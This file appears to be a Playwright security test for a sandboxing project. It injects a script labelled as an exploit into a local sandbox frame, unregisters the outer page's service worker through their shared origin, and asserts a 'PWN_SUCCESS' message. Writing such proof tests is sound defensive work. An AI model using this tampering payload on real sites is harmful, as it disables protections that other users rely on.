import { test, expect } from '@playwright/test';

test('Service Worker Tampering', async ({ page }) => {
  // 1. Setup
  await page.goto('http://localhost:3333/playground/security.html');
  await page.waitForFunction(() => window.SandboxControl !== undefined);

  // Enable scripts
  await page.evaluate(() => {
     window.SandboxControl.sandboxElement.setAttribute('script-unsafe', 'true');
  });
  await page.waitForTimeout(2000);

  // 2. Exploit: Unregister the Service Worker
  // The inner frame shares the origin 'http://sandbox.localhost:3333' with the outer frame.
  // The outer frame registered the SW.
  // Therefore, the inner frame can access and unregister it.

  const payload = `
    (async () => {
      try {
        console.log("[Exploit] Checking registrations...");
        const regs = await navigator.serviceWorker.getRegistrations();
        console.log("[Exploit] Found " + regs.length + " registrations.");

        if (regs.length === 0) {
             window.top.postMessage({ type: 'INFO', message: 'No SW found (already gone?)' }, '*');
             return;
        }

        for (const reg of regs) {
            console.log("[Exploit] Unregistering SW...");
            const success = await reg.unregister();
            if (success) {
                window.top.postMessage({ type: 'PWN_SUCCESS', message: 'Service Worker Unregistered' }, '*');
            } else {
                window.top.postMessage({ type: 'PWN_FAILURE', message: 'Failed to unregister' }, '*');
            }
        }
      } catch (e) {
        window.top.postMessage({ type: 'ERROR', message: e.message }, '*');
      }
    })();
  `;

  console.log("Triggering exploit...");
  await page.evaluate((code) => {
    window.SandboxControl.execute(code);
  }, payload);

  // 3. Verify
  const result = await page.evaluate(() => {
      return new Promise(resolve => {
          window.addEventListener('message', m => {
              if (m.data.type === 'PWN_SUCCESS') resolve(m.data);
          });
      });
  });

  expect(result.message).toBe('Service Worker Unregistered');
  console.log("Exploit Success:", result);
});
